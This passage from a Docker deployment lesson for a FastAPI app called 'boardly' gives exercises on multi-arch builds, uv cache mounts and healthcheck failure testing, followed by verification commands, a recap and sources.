**Exercise 7 — Multi-arch build.** Build for `linux/amd64` and `linux/arm64` in one manifest. Verify: `docker buildx build --platform=linux/amd64,linux/arm64 -t boardly:multi-arch --push .` (you need a registry — use `ghcr.io/<user>/boardly:multi-arch`); then `docker manifest inspect ghcr.io/<user>/boardly:multi-arch | jq '.manifests | length'` should be `2`. Then `docker buildx imagetools inspect ghcr.io/<user>/boardly:multi-arch | rg 'Platform:'` should list both `linux/amd64` and `linux/arm64`. Pull and run each: `docker pull --platform=linux/arm64 ghcr.io/<user>/boardly:multi-arch` and `docker run --rm --platform=linux/arm64 ghcr.io/<user>/boardly:multi-arch python -c 'import platform; print(platform.machine())'` should print `aarch64` (or `x86_64` on amd64). Document the build-time cost of the second platform (typically 2x). The [[16-Deployment-and-DevOps/GitHub-Actions-CI]] forward ref covers the CI matrix that builds both arches in parallel.

**Exercise 8 — BuildKit cache mount.** Add `RUN --mount=type=cache,target=/root/.cache/uv uv sync --frozen --no-dev --no-install-project` to the deps layer, bump a dep in `pyproject.toml` (e.g. `httpx` 0.27 -> 0.28), regenerate `uv.lock`, and measure the rebuild. Verify: `docker build --no-cache -t boardly:cold .` (cold: re-downloads every wheel); `docker build -t boardly:warm .` (warm: the `--mount=type=cache` reuses the uv cache, only the NEW wheels are downloaded). Assert with `docker build -t boardly:warm --progress=plain . 2>&1 | rg 'Downloaded'` that the count of downloaded packages equals the count of NEW/changed packages only (typically 1-3), not the full tree. Document the cold-vs-warm wall-clock delta (typically 30 s -> 5 s). Trade-off: the cache is per-builder-host and is NOT part of the image, so two builds on different runners do not share it — use `--cache-from=type=remote,ref=...` for cross-runner sharing. The [[01-Python-Foundations/uv-Tooling-Workflows]] forward ref covers the `uv` cache discipline.

**Exercise 9 — Healthcheck flap test.** Verify the container goes `unhealthy` after `--interval * --retries` consecutive failures, not on the first. Verify: `docker run --rm -d -p 8000:8000 --name flap boardly:$(git rev-parse --short HEAD)`; wait 20 s; `docker inspect --format '{{.State.Health.Status}}' flap` should be `healthy`. Then simulate a broken `/healthz` by killing uvicorn inside the container: `docker exec flap pkill -f uvicorn` (the `python -c` healthcheck now gets a connection refused). Wait `--interval * --retries + 5s = 95s`; `docker inspect --format '{{.State.Health.Status}}' flap` should be `unhealthy`. Inspect the failing checks: `docker inspect --format '{{json .State.Health.Log}}' flap | jq '.[-3:]'` should show three consecutive `exit-code: 1` entries. Document why `--start-period` does not apply post-start (it is a one-shot window, not a recurring shield). The [[02b-Backend-Foundations/Health-Checks-and-Probes]] + [[03-FastAPI-Core/Application-and-Lifespan]] forward refs cover the liveness-vs-readiness split.

## Verification

```bash
# Build
docker build -t boardly:$(git rev-parse --short HEAD) .

# Inspect
docker image inspect boardly:$(git rev-parse --short HEAD) \
 --format '{{.Config.User}} / {{.Os}} / {{.Architecture}}'
# Expect: 1000 / linux / amd64

# Inspect the entrypoint + cmd
docker image inspect boardly:$(git rev-parse --short HEAD) \
 --format 'Entrypoint: {{json .Config.Entrypoint}} Cmd: {{json .Config.Cmd}}'
# Expect: Entrypoint: ["/usr/bin/tini","--"] Cmd: ["uvicorn","boardly.main:app",...]

# Inspect the healthcheck
docker image inspect boardly:$(git rev-parse --short HEAD) \
 --format 'Healthcheck: {{json .Config.Healthcheck}}'

# Run
docker run --rm -p 8000:8000 --name boardly boardly:$(git rev-parse --short HEAD)

# In another shell, after 15s:
curl -sf http://localhost:8000/healthz
# Expect: {"status":"ok"}

# Check the container's health status
docker inspect --format '{{.State.Health.Status}}' boardly
# Expect: healthy

# Verify no package manager in the runtime image:
docker run --rm --entrypoint sh boardly:$(git rev-parse --short HEAD) -c 'which pip; which uv; which gcc; echo done'
# Expect: not found / not found / not found / done

# Verify the container drops privileges.
# Override CMD with `id` (ENTRYPOINT `tini --` is preserved, so tini exec's `id`).
# NB: `docker run --rm --entrypoint id IMAGE` would *not* clear the original CMD
# args (`uvicorn boardly.main:app ...`) and `id` would error on the extra operands;
# overriding CMD via `IMAGE id` is the clean fix.
docker run --rm boardly:$(git rev-parse --short HEAD) id
# Expect: uid=1000(app) gid=1000(app) groups=1000(app)
```

## Previously Learned Here

- **`uv`** — first taught in [[01-Python-Foundations/uv-Tooling-Workflows]]. The new detail is `UV_PROJECT_ENVIRONMENT=/app/.venv` to pin the venv path, `UV_PYTHON_PREFERENCE=only-system` to stop `uv` from downloading a different Python than the image's, and `uv sync --frozen --no-dev --no-install-project` to populate the deps layer independently of the source.
- **Pydantic Settings** — first taught in [[04-Pydantic/Pydantic-Settings]]. The new detail is the `env_prefix="APP_"` convention so every env var a container needs is namespaced and discoverable with `env | grep ^APP_`.
- **ASGI** — first taught in [[02-Web-and-HTTP/ASGI-Starlette-Uvicorn]]. The new detail is running `uvicorn` under `tini` as PID 1 so `SIGTERM` propagates through to lifespan shutdown.
- **FastAPI lifespan** — first taught in [[03-FastAPI-Core/Application-and-Lifespan]]. The new detail is that lifespan startup must complete before `/healthz` flips to 200, which is why `HEALTHCHECK` has a `start-period` of 15 seconds.

## What's Next

The image we just built is what the next three lessons compose into a real deployment:

- **[[Docker-Compose-Local-Dev]]** builds this image with a `dev` target, mounts the source as a bind mount, and turns on `--reload`. The same `compose.yaml` is what CI in Lesson 3 uses for service containers.
- **[[GitHub-Actions-CI]]** builds this exact `Dockerfile` in CI, runs `ruff`/`mypy`/`pytest` against service-container Postgres+Redis, and pushes the image to `ghcr.io` on `main`.
- **[[Migration-Ordering-and-Rollback]]** runs `alembic upgrade head` inside a one-shot container built from this image, *before* the new code rolls. The deploy job acquires a `pg_advisory_lock` so two replicas cannot race.

## Sources

- Docker — Multi-stage builds — <https://docs.docker.com/build/building/multistage/> — the canonical reference for `COPY --from=...`.
- Docker — Dockerfile reference (`HEALTHCHECK`, `USER`, `ENTRYPOINT`, `CMD`) — <https://docs.docker.com/reference/dockerfile/>.
- Astral — `uv` Docker integration — <https://docs.astral.sh/uv/guides/integration/docker/> — the pinned `ghcr.io/astral-sh/uv` image and `UV_PROJECT_ENVIRONMENT`.
- krallin / `tini` — <https://github.com/krallin/tini> — why PID 1 in containers needs a proper init.
- FastAPI — Deployment — <https://fastapi.tiangolo.com/deployment/> — server and reverse-proxy patterns.
- Python Docker image — <https://hub.docker.com/_/python> — the `slim` vs. `alpine` vs. `full` variants.
- See [[21-Reference-Library/Source-Register]] for the full source list with dates accessed.

## What We Learned

- A two-stage `Dockerfile` builds the deps in the builder (with `uv 0.13.1`) and copies only the venv + app source into a fresh `python:3.12-slim` runtime.
- Layer ordering matters: copy `pyproject.toml` + `uv.lock` *before* the source so the deps layer caches on the lockfile, not on every code change.
- `USER 1000` after a `groupadd`/`useradd` drops privileges so a container escape lands as UID 1000 on the host, not as root.
- `tini` as `ENTRYPOINT` reaps zombies and translates `SIGTERM` into the ASGI shutdown, so lifespan shutdown actually runs.
- The exec-form `CMD ["uvicorn", ...]` (not the string form) is what makes `SIGTERM` reach `uvicorn` instead of being eaten by `/bin/sh`.
- `HEALTHCHECK` hits `/healthz` (liveness, no DB) so a DB blip does not cascade into a restart loop. The orchestrator's readiness probe hits `/readyz` (with DB).
- The image you build is byte-for-byte identical between environments; the only thing that varies is injected env vars.

---

**Tags:** #docker #deployment #security #containers #review
**Previous:** [[16-Deployment-and-DevOps/00-Deployment-MOC]]
**Next:** [[16-Deployment-and-DevOps/Docker-Compose-Local-Dev]] →
